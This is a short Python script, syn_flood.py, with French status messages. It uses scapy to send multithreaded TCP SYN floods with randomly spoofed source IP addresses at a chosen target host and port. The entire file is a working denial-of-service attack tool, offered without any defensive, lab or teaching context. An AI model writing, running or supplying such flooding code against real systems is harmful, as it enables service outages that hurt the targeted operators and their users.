# syn_flood.py

from scapy.all import IP, TCP, send
import random
from colorama import init, Fore, Style
from random import randint
import threading

init(autoreset=True)

def generate_random_ip():
    while True:
        ip = ".".join(map(str, (randint(1, 254) for _ in range(4))))
        if not ip.startswith(("127.", "169.254.", "255.")):
            return ip

def syn_flooding_thread(ip_target_host, port_target_host, packets_counter, thread_id):
    print(f"{Fore.CYAN}[i] Thread {thread_id} - Envoi de {packets_counter} paquets à {ip_target_host}:{port_target_host}{Style.RESET_ALL}")
    for i in range(packets_counter):
        ip_packet = IP(src=generate_random_ip(), dst=ip_target_host)
        tcp_packet = TCP(
            sport=random.randint(1024, 65535),
            dport=port_target_host,
            flags='S',
            seq=random.randint(0, 4294967295)
        )
        send(ip_packet / tcp_packet, verbose=0)
        if (i + 1) % 50 == 0:
            print(f"{Fore.YELLOW}[Thread {thread_id}] {i + 1} paquets envoyés...")

    print(f"{Fore.GREEN}[✓] Thread {thread_id} terminé. Total : {packets_counter}")

def run_syn_flood(ip_target_host, port_target_host, packets_counter, thread_count):
    threads = [
        threading.Thread(
            target=syn_flooding_thread,
            args=(ip_target_host, port_target_host, packets_counter, i + 1)
        )
        for i in range(thread_count)
    ]

    for t in threads: t.start()
    for t in threads: t.join()

    print(f"{Fore.GREEN}[✓] SYN Flood terminé ({thread_count} threads)")
